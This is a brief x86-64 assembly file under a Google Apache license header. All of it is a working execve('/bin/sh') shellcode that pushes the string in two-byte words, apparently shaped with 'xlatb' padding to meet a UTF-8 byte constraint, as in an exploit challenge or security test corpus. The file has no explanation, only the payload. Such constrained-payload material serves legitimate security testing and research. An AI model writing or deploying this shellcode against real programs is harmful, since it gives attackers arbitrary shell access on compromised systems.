# Copyright 2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

[bits 64]

add al, 0


xlatb ; utf8
mov rdx, 0
xlatb ; utf8
mov eax, 0x3b


push strict word 0x0068
push strict word 0x732f
push strict word 0x6e69
push strict word 0x622f

;mov rbx,0x68732f6e69622f
;push rbx



push rsp
pop rdi
push rdx
push rdi
push rsp
pop rsi





syscall
